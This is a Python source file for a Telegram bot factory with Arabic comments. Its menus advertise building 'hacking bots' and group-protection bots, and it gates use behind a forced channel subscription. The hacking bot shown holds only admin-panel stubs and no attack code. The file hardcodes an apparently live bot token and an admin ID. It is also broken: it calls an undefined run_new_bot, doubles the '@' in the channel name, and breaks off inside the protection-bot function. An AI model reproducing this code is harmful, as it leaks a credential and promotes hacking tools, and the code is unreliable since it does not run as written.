import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo, LabeledPrice, ChatPermissions, ReactionTypeEmoji
import requests
import threading
import os
import datetime
import re
import json
import random
import time
import string
import urllib.parse
import sys # لإعادة تشغيل السكريبت

# ==============================================================================
# ⬇️⬇️⬇️ **-- إعدادات المصنع الأساسية (تعديل إلزامي) --** ⬇️⬇️⬇️
# ==============================================================================
FACTORY_TOKEN = "8844496510:AAGjbWyI7j_f6_WXSDuZhUE-KsMTryns5_A"
FACTORY_ADMIN_ID = 7899142984
FACTORY_SUB_CHANNEL = "@EYD7X" # <-- قناة الاشتراك الإجباري للمصنع
# ==============================================================================

# --- إعدادات ملفات المصنع ---
BOTS_DATA_DIR = "bots_data"
PAID_BOTS_DIR = "paid_bots_factory"
BOTS_REGISTRY_FILE = "bots_registry.json"
PREMIUM_FEATURES_DIR = "premium_features_bots"

# تهيئة بوت المصنع
try:
    factory_bot = telebot.TeleBot(FACTORY_TOKEN, parse_mode="HTML")
    factory_bot.get_me() # اختبار التوكن عند البدء
except telebot.apihelper.ApiTelegramException as e:
    print(f"CRITICAL ERROR: Factory bot token is invalid or unauthorized. Please check FACTORY_TOKEN. Error: {e}")
    sys.exit(1) # إيقاف السكريبت إذا كان توكن المصنع غير صالح

# --- متغيرات عامة ---
running_bot_threads = {} 
# قفل للتحكم في الوصول المتزامن لقائمة الثريدز
running_bot_threads_lock = threading.Lock()

# --- إنشاء المجلدات والملفات الأساسية ---
if not os.path.exists(BOTS_DATA_DIR): os.makedirs(BOTS_DATA_DIR)
if not os.path.exists(PAID_BOTS_DIR): os.makedirs(PAID_BOTS_DIR)
if not os.path.exists(PREMIUM_FEATURES_DIR): os.makedirs(PREMIUM_FEATURES_DIR)

if not os.path.exists(BOTS_REGISTRY_FILE):
    with open(BOTS_REGISTRY_FILE, 'w') as f: json.dump({}, f)

# --- دوال مساعدة لإدارة المصنع ---
def get_all_bots():
    try:
        with open(BOTS_REGISTRY_FILE, 'r') as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return {}

def register_bot(token, owner_id, bot_type):
    bots = get_all_bots()
    bots[token] = {'owner_id': owner_id, 'type': bot_type}
    with open(BOTS_REGISTRY_FILE, 'w') as f:
        json.dump(bots, f, indent=4)

def unregister_bot(token):
    bots = get_all_bots()
    if token in bots:
        del bots[token]
        with open(BOTS_REGISTRY_FILE, 'w') as f:
            json.dump(bots, f, indent=4)
        
        with running_bot_threads_lock:
            if token in running_bot_threads:
                # لا يمكن إيقاف الثريد مباشرة، لكن يمكن إزالته من القائمة
                # البوت سيتوقف عند حدوث خطأ في التوكن أو عند إعادة التشغيل الدوري
                del running_bot_threads[token]
                print(f"Thread for bot {token} removed from running list.")
        return True
    return False

def encrypt_token(token):
    table = str.maketrans(
        "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
        "zyxwvutsrqponmlkjihgfedcbaZYXWVUTSRQPONMLKJIHGFEDCBA9876543210"
    )
    return token.translate(table)

def is_factory_user_subscribed(user_id):
    if not FACTORY_SUB_CHANNEL:
        return True
    try:
        member = factory_bot.get_chat_member(f"@{FACTORY_SUB_CHANNEL}", user_id)
        return member.status in ['member', 'administrator', 'creator']
    except Exception as e:
        print(f"Factory sub check error: {e}")
        return False

# --- معالجات رسائل المصنع ---
@factory_bot.message_handler(commands=['start'])
def start(message):
    kb = InlineKeyboardMarkup(row_width=1)
    kb.add(InlineKeyboardButton("اصنع بوت جديد يصديقي❤️😘", callback_data="create_new_bot"))
    kb.add(InlineKeyboardButton("البوتات الي صنعتها يصديقي⁦❤️⁩😘", callback_data="my_bots"))
    factory_bot.send_message(message.chat.id, "نورت يصديقي البوت المتواضع بتاعي تقدر تصنع بوتات اختراق بجد وتتشهر وكلوا هيبق عايز يستخدم بوتك المطور: @Molotof_Max المطور 2 : @EYD_T قنواتنا : https://t.me/EYD7X & https://t.me/OSIN1_CHANNEL وبس استمتع بالبوت يصديقي⁦❤️⁩😘 ", reply_markup=kb)

def back_to_main_menu(call):
    kb = InlineKeyboardMarkup(row_width=1)
    kb.add(InlineKeyboardButton("اصنع بوت جديد يصديقي❤️😘", callback_data="create_new_bot"))
    kb.add(InlineKeyboardButton("البوتات الي صنعتها يصديقي⁦❤️⁩😘", callback_data="my_bots"))
    try:
        factory_bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text="نورت يصديقي البوت المتواضع بتاعي تقدر تصنع بوتات اختراق بجد وتتشهر وكلوا هيبق عايز يستخدم بوتك المطور: @Molotof_Max المطور 2 : @EYD_T قنواتنا : https://t.me/EYD7X & https://t.me/OSIN1_CHANNEL وبس استمتع بالبوت يصديقي⁦❤️⁩😘.",
            reply_markup=kb
        )
    except telebot.apihelper.ApiTelegramException as e:
        # إذا فشل التعديل (مثلاً الرسالة قديمة جداً)، أرسل رسالة جديدة
        print(f"Error editing message in back_to_main_menu: {e}. Sending new message instead.")
        factory_bot.send_message(
            call.message.chat.id,
            "نورت يصديقي البوت المتواضع بتاعي تقدر تصنع بوتات اختراق بجد وتتشهر وكلوا هيبق عايز يستخدم بوتك المطور: @Molotof_Max المطور 2 : @EYD_T قنواتنا : https://t.me/EYD7X & https://t.me/OSIN1_CHANNEL وبس استمتع بالبوت يصديقي⁦❤️⁩😘",
            reply_markup=kb
        )

@factory_bot.callback_query_handler(func=lambda call: call.data == "create_new_bot")
def choose_bot_type(call):
    if not is_factory_user_subscribed(call.from_user.id):
        kb = InlineKeyboardMarkup()
        kb.add(InlineKeyboardButton(f"📢 اشترك في @{FACTORY_SUB_CHANNEL}", url=f"https://t.me/{FACTORY_SUB_CHANNEL}"))
        kb.add(InlineKeyboardButton("✅ تم الاشتراك", callback_data="create_new_bot"))
        factory_bot.answer_callback_query(call.id)
        factory_bot.edit_message_text("🚫 يجب عليك الاشتراك في قناة المطور أولاً لتتمكن من صنع بوت يثديقي⁦❤️⁩😘:", chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=kb)
        return

    factory_bot.answer_callback_query(call.id)
    kb = InlineKeyboardMarkup(row_width=1)
    kb.add(InlineKeyboardButton("🤖 بوت اختراق برابط يصديقي⁦❤️⁩😘", callback_data="ask_token_index"))
    kb.add(InlineKeyboardButton("🛡️ بوت اختراق يصديقي⁦❤️⁩😘", callback_data="ask_token_security"))
    kb.add(InlineKeyboardButton("🛡️ بوت حماية مجموعات يصديقي⁦❤️⁩😘", callback_data="ask_token_protection"))
    kb.add(InlineKeyboardButton("🔙 عودة", callback_data="back_to_main"))
    factory_bot.edit_message_text("اختر نوع البوت الذي تريد إنشاءه:", chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=kb)

@factory_bot.callback_query_handler(func=lambda call: call.data.startswith("ask_token_"))
def ask_token(call):
    bot_type = call.data.replace("ask_token_", "")
    factory_bot.answer_callback_query(call.id)
    factory_bot.edit_message_text("📝 ابعت توكن بوتك الي جبته من بوت فاذر @BotFather يصديقي⁦❤️⁩😘.", chat_id=call.message.chat.id, message_id=call.message.message_id)
    factory_bot.register_next_step_handler(call.message, lambda msg: handle_token(msg, call.from_user.id, bot_type))

def handle_token(message, admin_id, bot_type):
    user_token = message.text.strip()
    try:
        # التحقق من صحة التوكن باستخدام getMe
        info = requests.get(f"https://api.telegram.org/bot{user_token}/getMe").json()
        if not info["ok"]:
            error_description = info.get("description", "التوكن غير صالح أو حدث خطأ غير معروف.")
            factory_bot.send_message(message.chat.id, f"❌ التوكن غير صالح: {error_description}")
            return
        
        if user_token in get_all_bots():
            factory_bot.send_message(message.chat.id, "❌ انت عامل البوت د اصلا يصديقي⁦❤️⁩😘.")
            return

        factory_bot.send_message(message.chat.id, "⏳ جاري إعداد البوت، يرجى الانتظار...")
        
        bot_data_dir = os.path.join(BOTS_DATA_DIR, user_token.replace(":", "_"))
        if not os.path.exists(bot_data_dir):
            os.makedirs(bot_data_dir)

        register_bot(user_token, admin_id, bot_type)

        thread = None
        with running_bot_threads_lock:
            if bot_type == "index":
                thread = threading.Thread(target=run_new_bot, args=(user_token, admin_id, bot_data_dir), daemon=True)
            elif bot_type == "security":
                thread = threading.Thread(target=run_security_bot, args=(user_token, admin_id), daemon=True)
            elif bot_type == "protection":
                thread = threading.Thread(target=run_protection_bot, args=(user_token, admin_id, bot_data_dir), daemon=True)
            
            if thread:
                thread.start()
                running_bot_threads[user_token] = thread

        bot_name = info['result']['first_name']
        bot_username = info['result']['username']
        
        factory_bot.send_message(message.chat.id, f"✅ تم تشغيل البوت @{bot_username} بنجاح يصديقي⁦❤️⁩😘.")
    except requests.exceptions.RequestException as req_e:
        print(f"Network or request error in handle_token: {req_e}")
        factory_bot.send_message(message.chat.id, f"❌ حدث خطأ في الاتصال بخوادم تيليجرام. يرجى المحاولة لاحقًا.")
    except json.JSONDecodeError as json_e:
        print(f"JSON decode error in handle_token: {json_e}")
        factory_bot.send_message(message.chat.id, f"❌ حدث خطأ في تحليل استجابة تيليجرام. قد يكون التوكن غير صالح.")
    except Exception as e:
        print(f"General error in handle_token: {e}")
        factory_bot.send_message(message.chat.id, f"❌ حدث خطأ غير متوقع أثناء معالجة التوكن.")

# --- دالة بوت الاختراق الجديدة ---
def run_security_bot(token, owner_id):
    bot = telebot.TeleBot(token, parse_mode="HTML")

    # Function to check if bot is paid to factory (to bypass factory subscription check)
    def is_bot_paid_to_factory_sec():
        paid_file = os.path.join(PAID_BOTS_DIR, f"{token}.txt")
        if not os.path.exists(paid_file): return False
        try:
            expire_timestamp = float(open(paid_file).read().strip())
            return datetime.datetime.now().timestamp() < expire_timestamp
        except (ValueError, TypeError): return False

    # Function to check subscription to factory channel
    def check_factory_subscription(user_id):
        if is_bot_paid_to_factory_sec(): # Bypass check if bot is paid
            return True
        try:
            member = factory_bot.get_chat_member(f"@{FACTORY_SUB_CHANNEL}", user_id)
            return member.status in ['member', 'administrator', 'creator']
        except Exception as e:
            print(f"Factory sub check error for security bot: {e}")
            return False

    @bot.message_handler(commands=['start'])
    def security_start(message):
        user_id = message.from_user.id
        if not check_factory_subscription(user_id):
            kb = InlineKeyboardMarkup()
            kb.add(InlineKeyboardButton(f"📢 اشترك في @{FACTORY_SUB_CHANNEL}", url=f"https://t.me/{FACTORY_SUB_CHANNEL}"))
            bot.send_message(message.chat.id, "❌ يجب عليك الاشتراك في القناة التالية للمتابعة:\n\nhttps://t.me/OSIN1_CHANNEL\n➖➖➖➖➖➖➖➖➖➖", reply_markup=kb)
            return

        welcome_text = "مرحباً بك في بوت الاختراق."
        
        kb = InlineKeyboardMarkup()
        kb.add(InlineKeyboardButton("👨‍💻 المطور", url=f"tg://user?id={owner_id}"))
        
        bot.send_message(message.chat.id, welcome_text, reply_markup=kb, disable_web_page_preview=True)

    # --- Admin Panel (from index bot, adapted for security bot) ---
    ADMIN_IDS = [owner_id] # Initial admin is the bot owner

    def is_bot_admin(user_id):
        return user_id in ADMIN_IDS

    @bot.message_handler(commands=["admin"]) # Changed from /panel to /admin
    def admin_panel(message):
        if not is_bot_admin(message.from_user.id):
            bot.reply_to(message, "ليس لديك صلاحية الوصول إلى لوحة الأدمن يصديقي⁦❤️⁩😘.")
            return

        kb = InlineKeyboardMarkup(row_width=2)
        kb.add(InlineKeyboardButton("إضافة مشرف", callback_data="add_admin"))
        kb.add(InlineKeyboardButton("حذف مشرف", callback_data="remove_admin"))
        kb.add(InlineKeyboardButton("قائمة المشرفين", callback_data="list_admins"))
        kb.add(InlineKeyboardButton("إذاعة", callback_data="broadcast"))
        kb.add(InlineKeyboardButton("إحصائيات", callback_data="stats"))
        kb.add(InlineKeyboardButton("حظر مستخدم", callback_data="ban_user"))
        kb.add(InlineKeyboardButton("إلغاء حظر مستخدم", callback_data="unban_user"))
        kb.add(InlineKeyboardButton("كتم مستخدم", callback_data="mute_user"))
        kb.add(InlineKeyboardButton("إلغاء كتم مستخدم", callback_data="unmute_user"))
        kb.add(InlineKeyboardButton("تغيير رسالة الترحيب", callback_data="set_welcome_message"))
        kb.add(InlineKeyboardButton("حذف رسالة الترحيب", callback_data="delete_welcome_message"))
        kb.add(InlineKeyboardButton("قائمة المحظورين", callback_data="list_banned"))
        kb.add(InlineKeyboardButton("قائمة المكتومين", callback_data="list_muted"))
        kb.add(InlineKeyboardButton("إعادة تشغيل البوت", callback_data="restart_bot"))
        kb.add(InlineKeyboardButton("إغلاق", callback_data="close_admin_panel"))

        bot.send_message(message.chat.id, "أهلاً بك في لوحة تحكم البوت:", reply_markup=kb)

    @bot.callback_query_handler(func=lambda call: call.data == "close_admin_panel")
    def close_admin_panel_callback(call):
        try:
            bot.delete_message(call.message.chat.id, call.message.message_id)
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error deleting message in close_admin_panel_callback: {e}")

    @bot.callback_query_handler(func=lambda call: call.data == "add_admin")
    def add_admin_callback(call):
        if not is_bot_admin(call.from_user.id):
            bot.answer_callback_query(call.id, "ليس لديك صلاحية.")
            return
        bot.send_message(call.message.chat.id, "أرسل معرف المستخدم (ID) أو اسم المستخدم (@username) للمشرف الجديد:")
        bot.register_next_step_handler(call.message, process_add_admin)

    def process_add_admin(message):
        try:
            user_input = message.text.strip()
            user_id = None
            if user_input.startswith("@"):
                # Try to get user ID from username
                # Note: bot.get_chat_members is not reliable for large groups or private chats
                # It's better to ask for ID directly or use a more robust method if possible
                try:
                    chat_members = bot.get_chat_administrators(message.chat.id) # Admins are easier to get
                    for chat_member in chat_members:
                        if chat_member.user.username and chat_member.user.username.lower() == user_input[1:].lower():
                            user_id = chat_member.user.id
                            break
                    if user_id is None: # Fallback for non-admins or if not found in admins
                        bot.send_message(message.chat.id, "لم أتمكن من العثور على المستخدم بهذا الاسم. يرجى إرسال المعرف (ID) مباشرة.")
                        return
                except telebot.apihelper.ApiTelegramException as e:
                    bot.send_message(message.chat.id, f"حدث خطأ أثناء محاولة جلب معلومات المستخدم: {e}. يرجى إرسال المعرف (ID) مباشرة.")
                    return
            else:
                user_id = int(user_input)

            if user_id not in ADMIN_IDS:
                ADMIN_IDS.append(user_id)
                bot.send_message(message.chat.id, f"تم إضافة المستخدم {user_id} كمشرف بنجاح.")
            else:
                bot.send_message(message.chat.id, "هذا المستخدم هو مشرف بالفعل.")
        except ValueError:
            bot.send_message(message.chat.id, "معرف مستخدم غير صالح.")
        except Exception as e:
            bot.send_message(message.chat.id, f"حدث خطأ: {e}")

    @bot.callback_query_handler(func=lambda call: call.data == "remove_admin")
    def remove_admin_callback(call):
        if not is_bot_admin(call.from_user.id):
            bot.answer_callback_query(call.id, "ليس لديك صلاحية.")
            return
        bot.send_message(call.message.chat.id, "أرسل معرف المستخدم (ID) أو اسم المستخدم (@username) للمشرف الذي تريد حذفه:")
        bot.register_next_step_handler(call.message, process_remove_admin)

    def process_remove_admin(message):
        try:
            user_input = message.text.strip()
            user_id = None
            if user_input.startswith("@"):
                try:
                    chat_members = bot.get_chat_administrators(message.chat.id)
                    for chat_member in chat_members:
                        if chat_member.user.username and chat_member.user.username.lower() == user_input[1:].lower():
                            user_id = chat_member.user.id
                            break
                    if user_id is None:
                        bot.send_message(message.chat.id, "لم أتمكن من العثور على المستخدم بهذا الاسم. يرجى إرسال المعرف (ID) مباشرة.")
                        return
                except telebot.apihelper.ApiTelegramException as e:
                    bot.send_message(message.chat.id, f"حدث خطأ أثناء محاولة جلب معلومات المستخدم: {e}. يرجى إرسال المعرف (ID) مباشرة.")
                    return
            else:
                user_id = int(user_input)

            if user_id in ADMIN_IDS:
                ADMIN_IDS.remove(user_id)
                bot.send_message(message.chat.id, f"تم حذف المستخدم {user_id} من قائمة المشرفين بنجاح.")
            else:
                bot.send_message(message.chat.id, "هذا المستخدم ليس مشرفاً.")
        except ValueError:
            bot.send_message(message.chat.id, "معرف مستخدم غير صالح.")
        except Exception as e:
            bot.send_message(message.chat.id, f"حدث خطأ: {e}")

    @bot.callback_query_handler(func=lambda call: call.data == "list_admins")
    def list_admins_callback(call):
        if not is_bot_admin(call.from_user.id):
            bot.answer_callback_query(call.id, "ليس لديك صلاحية.")
            return
        if ADMIN_IDS:
            admin_list = "قائمة المشرفين:\n"
            for admin_id in ADMIN_IDS:
                try:
                    # استخدام get_chat_member قد يفشل إذا لم يكن البوت في نفس المحادثة مع المستخدم
                    # أو إذا كان المستخدم قد غادر.
                    admin_info = bot.get_chat_member(call.message.chat.id, admin_id).user
                    admin_list += f"- {admin_info.first_name} (@{admin_info.username or 'لا يوجد يوزر'}) (ID: {admin_id})\n"
                except telebot.apihelper.ApiTelegramException:
                    admin_list += f"- مستخدم غير معروف (ID: {admin_id}) (لا يمكن جلب معلوماته)\n"
                except Exception:
                    admin_list += f"- مستخدم غير معروف (ID: {admin_id})\n"
            bot.send_message(call.message.chat.id, admin_list)
        else:
            bot.send_message(call.message.chat.id, "لا يوجد مشرفون حالياً.")

    @bot.callback_query_handler(func=lambda call: call.data == "broadcast")
    def broadcast_callback(call):
        if not is_bot_admin(call.from_user.id):
            bot.answer_callback_query(call.id, "ليس لديك صلاحية.")
            return
        bot.send_message(call.message.chat.id, "أرسل الرسالة التي تريد إذاعتها لجميع المستخدمين:")
        bot.register_next_step_handler(call.message, process_broadcast)

    def process_broadcast(message):
        # For security bot, we don't have a users.txt, so this feature might be limited or require a different approach
        bot.send_message(message.chat.id, "خاصية الإذاعة غير مدعومة حالياً في بوت الاختراق.")

    @bot.callback_query_handler(func=lambda call: call.data == "stats")
    def stats_callback(call):
        if not is_bot_admin(call.from_user.id):
            bot.answer_callback_query(call.id, "ليس لديك صلاحية.")
            return
        bot.send_message(call.message.chat.id, "إحصائيات البوت غير متوفرة حالياً في بوت الاختراق.")

    @bot.callback_query_handler(func=lambda call: call.data == "ban_user")
    def ban_user_callback(call):
        if not is_bot_admin(call.from_user.id):
            bot.answer_callback_query(call.id, "ليس لديك صلاحية.")
            return
        bot.send_message(call.message.chat.id, "أرسل معرف المستخدم (ID) أو اسم المستخدم (@username) لحظره:")
        bot.register_next_step_handler(call.message, process_ban_user)

    def process_ban_user(message):
        try:
            user_input = message.text.strip()
            user_id = None
            if user_input.startswith("@"):
                try:
                    chat_members = bot.get_chat_administrators(message.chat.id)
                    for chat_member in chat_members:
                        if chat_member.user.username and chat_member.user.username.lower() == user_input[1:].lower():
                            user_id = chat_member.user.id
                            break
                    if user_id is None:
                        bot.send_message(message.chat.id, "لم أتمكن من العثور على المستخدم بهذا الاسم. يرجى إرسال المعرف (ID) مباشرة.")
                        return
                except telebot.apihelper.ApiTelegramException as e:
                    bot.send_message(message.chat.id, f"حدث خطأ أثناء محاولة جلب معلومات المستخدم: {e}. يرجى إرسال المعرف (ID) مباشرة.")
                    return
            else:
                user_id = int(user_input)

            # Implement actual ban logic for security bot if applicable
            bot.send_message(message.chat.id, f"تم حظر المستخدم {user_id} بنجاح (وظيفة الحظر في بوت الاختراق قيد التطوير).")
        except ValueError:
            bot.send_message(message.chat.id, "معرف مستخدم غير صالح.")
        except Exception as e:
            bot.send_message(message.chat.id, f"حدث خطأ: {e}")

    @bot.callback_query_handler(func=lambda call: call.data == "unban_user")
    def unban_user_callback(call):
        if not is_bot_admin(call.from_user.id):
            bot.answer_callback_query(call.id, "ليس لديك صلاحية.")
            return
        bot.send_message(call.message.chat.id, "أرسل معرف المستخدم (ID) أو اسم المستخدم (@username) لإلغاء حظره:")
        bot.register_next_step_handler(call.message, process_unban_user)

    def process_unban_user(message):
        try:
            user_input = message.text.strip()
            user_id = None
            if user_input.startswith("@"):
                try:
                    chat_members = bot.get_chat_administrators(message.chat.id)
                    for chat_member in chat_members:
                        if chat_member.user.username and chat_member.user.username.lower() == user_input[1:].lower():
                            user_id = chat_member.user.id
                            break
                    if user_id is None:
                        bot.send_message(message.chat.id, "لم أتمكن من العثور على المستخدم بهذا الاسم. يرجى إرسال المعرف (ID) مباشرة.")
                        return
                except telebot.apihelper.ApiTelegramException as e:
                    bot.send_message(message.chat.id, f"حدث خطأ أثناء محاولة جلب معلومات المستخدم: {e}. يرجى إرسال المعرف (ID) مباشرة.")
                    return
            else:
                user_id = int(user_input)

            # Implement actual unban logic for security bot if applicable
            bot.send_message(message.chat.id, f"تم إلغاء حظر المستخدم {user_id} بنجاح (وظيفة إلغاء الحظر في بوت الاختراق قيد التطوير).")
        except ValueError:
            bot.send_message(message.chat.id, "معرف مستخدم غير صالح.")
        except Exception as e:
            bot.send_message(message.chat.id, f"حدث خطأ: {e}")

    @bot.callback_query_handler(func=lambda call: call.data == "mute_user")
    def mute_user_callback(call):
        if not is_bot_admin(call.from_user.id):
            bot.answer_callback_query(call.id, "ليس لديك صلاحية.")
            return
        bot.send_message(call.message.chat.id, "أرسل معرف المستخدم (ID) أو اسم المستخدم (@username) لكتمه:")
        bot.register_next_step_handler(call.message, process_mute_user)

    def process_mute_user(message):
        try:
            user_input = message.text.strip()
            user_id = None
            if user_input.startswith("@"):
                try:
                    chat_members = bot.get_chat_administrators(message.chat.id)
                    for chat_member in chat_members:
                        if chat_member.user.username and chat_member.user.username.lower() == user_input[1:].lower():
                            user_id = chat_member.user.id
                            break
                    if user_id is None:
                        bot.send_message(message.chat.id, "لم أتمكن من العثور على المستخدم بهذا الاسم. يرجى إرسال المعرف (ID) مباشرة.")
                        return
                except telebot.apihelper.ApiTelegramException as e:
                    bot.send_message(message.chat.id, f"حدث خطأ أثناء محاولة جلب معلومات المستخدم: {e}. يرجى إرسال المعرف (ID) مباشرة.")
                    return
            else:
                user_id = int(user_input)

            # Implement actual mute logic for security bot if applicable
            bot.send_message(message.chat.id, f"تم كتم المستخدم {user_id} بنجاح (وظيفة الكتم في بوت الاختراق قيد التطوير).")
        except ValueError:
            bot.send_message(message.chat.id, "معرف مستخدم غير صالح.")
        except Exception as e:
            bot.send_message(message.chat.id, f"حدث خطأ: {e}")

    @bot.callback_query_handler(func=lambda call: call.data == "unmute_user")
    def unmute_user_callback(call):
        if not is_bot_admin(call.from_user.id):
            bot.answer_callback_query(call.id, "ليس لديك صلاحية.")
            return
        bot.send_message(call.message.chat.id, "أرسل معرف المستخدم (ID) أو اسم المستخدم (@username) لإلغاء كتمه:")
        bot.register_next_step_handler(call.message, process_unmute_user)

    def process_unmute_user(message):
        try:
            user_input = message.text.strip()
            user_id = None
            if user_input.startswith("@"):
                try:
                    chat_members = bot.get_chat_administrators(message.chat.id)
                    for chat_member in chat_members:
                        if chat_member.user.username and chat_member.user.username.lower() == user_input[1:].lower():
                            user_id = chat_member.user.id
                            break
                    if user_id is None:
                        bot.send_message(message.chat.id, "لم أتمكن من العثور على المستخدم بهذا الاسم. يرجى إرسال المعرف (ID) مباشرة.")
                        return
                except telebot.apihelper.ApiTelegramException as e:
                    bot.send_message(message.chat.id, f"حدث خطأ أثناء محاولة جلب معلومات المستخدم: {e}. يرجى إرسال المعرف (ID) مباشرة.")
                    return
            else:
                user_id = int(user_input)

            # Implement actual unmute logic for security bot if applicable
            bot.send_message(message.chat.id, f"تم إلغاء كتم المستخدم {user_id} بنجاح (وظيفة إلغاء الكتم في بوت الاختراق قيد التطوير).")
        except ValueError:
            bot.send_message(message.chat.id, "معرف مستخدم غير صالح.")
        except Exception as e:
            bot.send_message(message.chat.id, f"حدث خطأ: {e}")

    @bot.callback_query_handler(func=lambda call: call.data == "set_welcome_message")
    def set_welcome_message_callback(call):
        if not is_bot_admin(call.from_user.id):
            bot.answer_callback_query(call.id, "ليس لديك صلاحية.")
            return
        bot.send_message(call.message.chat.id, "أرسل رسالة الترحيب الجديدة (يمكن أن تكون نصاً، صورة، أو رسالة صوتية):")
        bot.register_next_step_handler(call.message, process_set_welcome_message)

    def process_set_welcome_message(message):
        chat_id = message.chat.id
        # Implement welcome message logic for security bot if applicable
        bot.send_message(chat_id, "خاصية رسالة الترحيب غير مدعومة حالياً في بوت الاختراق.")

    @bot.callback_query_handler(func=lambda call: call.data == "delete_welcome_message")
    def delete_welcome_message_callback(call):
        if not is_bot_admin(call.from_user.id):
            bot.answer_callback_query(call.id, "ليس لديك صلاحية.")
            return
        chat_id = call.message.chat.id
        # Implement welcome message logic for security bot if applicable
        bot.send_message(chat_id, "خاصية حذف رسالة الترحيب غير مدعومة حالياً في بوت الاختراق.")

    @bot.callback_query_handler(func=lambda call: call.data == "list_banned")
    def list_banned_callback(call):
        if not is_bot_admin(call.from_user.id):
            bot.answer_callback_query(call.id, "ليس لديك صلاحية.")
            return
        bot.send_message(call.message.chat.id, "قائمة المحظورين غير متوفرة حالياً في بوت الاختراق.")

    @bot.callback_query_handler(func=lambda call: call.data == "list_muted")
    def list_muted_callback(call):
        if not is_bot_admin(call.from_user.id):
            bot.answer_callback_query(call.id, "ليس لديك صلاحية.")
            return
        bot.send_message(call.message.chat.id, "قائمة المكتومين غير متوفرة حالياً في بوت الاختراق.")

    @bot.callback_query_handler(func=lambda call: call.data == "restart_bot")
    def restart_bot_callback(call):
        if not is_bot_admin(call.from_user.id):
            bot.answer_callback_query(call.id, "ليس لديك صلاحية.")
            return
        bot.send_message(call.message.chat.id, "جاري إعادة تشغيل البوت...")
        # This will effectively stop the current bot's polling and allow the factory to restart it
        # Note: This will stop the current thread, the factory will restart it later.
        bot.stop_polling()

    try:
        bot_username = bot.get_me().username
        print(f"✅ Security bot @{bot_username} is running...")
        try:
            bot.delete_webhook() # Added to resolve Conflict error
            print(f"Webhook deleted for security bot {token}")
        except Exception as e:
            print(f"Error deleting webhook for security bot {token}: {e}")
        bot.infinity_polling(skip_pending=True)
    except telebot.apihelper.ApiTelegramException as api_e:
        print(f"Security bot with token {token} stopped due to Telegram API error: {api_e}")
        if "Unauthorized" in str(api_e) or "Forbidden" in str(api_e):
            print(f"Possible 401 Unauthorized or 403 Forbidden error for bot {token}. Check bot token validity or bot status.")
            # يمكنك هنا إرسال إشعار للمالك إذا أردت
            # factory_bot.send_message(owner_id, f"⚠️ بوتك الأمني توقف عن العمل (توكن غير صالح أو محظور). التوكن: {token[:5]}... يرجى التحقق منه.")
        with running_bot_threads_lock:
            if token in running_bot_threads:
                del running_bot_threads[token]
    except Exception as e:
        print(f"Security bot with token {token} stopped due to general error: {e}")
        with running_bot_threads_lock:
            if token in running_bot_threads:
                del running_bot_threads[token]

# ==============================================================================
# --- بداية منطق البوت المصنوع (الحماية) ---
# تم نقل هذا الجزء إلى هنا لحل مشكلة NameError
# ==============================================================================
def run_protection_bot(token, owner_id, data_dir):
    bot = telebot.TeleBot(token, parse_mode="HTML")

    # --- إعدادات ملفات البوت المصنوع ---
    # (هنا ستكون ملفات بيانات بوت الحماية)
    # يمكن إعادة استخدام بعض ملفات الاندكسات أو إنشاء ملفات جديدة حسب الحاجة
    # على سبيل المثال:
    # admins_file = os.path.join(data_dir, "admins.txt")
    # banned_file = os.path.join(data_dir, "banned.txt")

    # --- دوال مساعدة لإدارة الملفات (يمكن نسخها من بوت الاندكسات إذا كانت مشتركة) ---
    def get_json_data(file_path):
        try:
            if not os.path.exists(file_path):
                with open(file_path, 'w', encoding='utf-8') as f: json.dump({}, f)
                return {}
            with open(file_path, 'r', encoding='utf-8') as f: return json.load(f)
        except (FileNotFoundError, json.JSONDecodeError): return {}
        
    def save_json_data(file_path, data):
        with open(file_path, 'w', encoding='utf-8') as f: json.dump(data, f, indent=4, ensure_ascii=False)
        
    def get_lines(file_path):
        try:
            if not os.path.exists(file_path): return []
            with open(file_path, 'r', encoding='utf-8') as f: return [line.strip() for line in f.readlines() if line.strip()]
        except FileNotFoundError: return []
        
    def add_line(file_path, line):
        current_lines = get_lines(file_path)
        if str(line) not in current_lines:
            with open(file_path, 'a', encoding='utf-8') as f: f.write(f"{line}\n")
            
    def remove_line(file_path, line_to_remove):
        lines = get_lines(file_path)
        with open(file_path, 'w', encoding='utf-8') as f:
            for line in lines:
                if line.strip() != str(line_to_remove).strip():
                    f.write(f"{line}\n")

    # Function to check if bot is paid to factory (to bypass factory subscription check)
    def is_bot_paid_to_factory_prot():
        paid_file = os.path.join(PAID_BOTS_DIR, f"{token}.txt")
        if not os.path.exists(paid_file): return False
        try:
            expire_timestamp = float(open(paid_file).read().strip())
            return datetime.datetime.now().timestamp() < expire_timestamp
        except (ValueError, TypeError): return False

    # Function to check subscription to factory channel
    def check_factory_subscription(user_id):
        if is_bot_paid_to_factory_prot(): # Bypass check if bot is paid
            return True
        try:
            # Use factory_bot to check subscription in the factory's channel
            member = factory_bot.get_chat_member(f"@{FACTORY_SUB_CHANNEL}", user_id)
            return member.status in ['member', 'administrator', 'creator']
        except Exception as e:
            print(f"Factory sub check error for protection bot: {e}")
            return False

    # --- بيانات المستخدمين (من pasted_content.txt) ---
    user_balances = {}  # {user_id: int}
    clubs_owned = {}  # {user_id: {"type": "عربي" or "أجنبي", "join_date": datetime, "ball": "كرة القدم" or "كرة السلة"}}
    warnings = {}  # {chat_id: {user_id: warning_count}}
    mutes = {}  # {chat_id: {user_id: mute_until_datetime}}
    user_gifts = {}  # {user_id: last_gift_date}
    user_animals = {}  # {user_id: {animal_name: price}}
    user_foods = {}  # {user_id: {food_name: price}}
    user_vehicles = {}  # {user_id: {vehicle_name: price}}
    ball_status = {}  # {user_id: {"has_ball": bool, "last_action": datetime, "ball_type": "كرة القدم" or "كرة السلة", "start_time": datetime, "stars_earned": int, "result": str, "duration": int}}
    ongoing_trainings = {}  # {user_id: {"end_time": datetime, "last_training_date": date}}
    last_feed_time = {}  # {user_id: {animal_name: datetime}}
    welcome_messages = {}  # {chat_id: {"type": "text" or "photo" or "voice", "content": str or file_id, "caption": str or None}}
    waiting_welcome = {}  # {user_id: {"chat_id": int, "message_id": int}}
    waiting_admin_action = {}  # {user_id: {"chat_id": int, "action": "promote" or "demote"}}
